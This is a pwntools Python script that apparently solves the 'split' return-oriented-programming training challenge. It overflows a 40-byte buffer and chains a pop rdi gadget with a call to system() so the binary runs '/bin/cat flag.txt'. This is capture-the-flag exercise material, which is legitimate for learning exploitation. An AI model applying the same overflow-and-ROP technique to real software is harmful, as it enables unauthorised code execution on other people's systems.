from pwn import * 



"""
                     usefulFunction:
0000000000400807         push       rbp                                         ; End of unwind block (FDE at 0x4009e4), Begin of unwind block (FDE at 0x400a04)
0000000000400808         mov        rbp, rsp
000000000040080b         mov        edi, aBinls                                 ; argument "__command" for method j_system, "/bin/ls"
0000000000400810         call       j_system                                    ; system
0000000000400815         nop
0000000000400816         pop        rbp
0000000000400817         ret
                        ; endp
0000000000400818         align      32 

000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt

"""


def exploit():

	p = process('./split')
	#p = gdb.debug('./split', 'b main')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("[*] Sending Exploit")

	pwn = "A" * 40 # overflow
	gadget = p64(0x400883) # pop rdi, ret
	pwn += gadget
	pwn+= p64(0x601060) # string to be placed in RDI 
	pwn+= p64(0x400810) # class system() -> system(RDI)

	p.recvuntil(">")
	p.sendline(pwn)
	p.interactive()

exploit()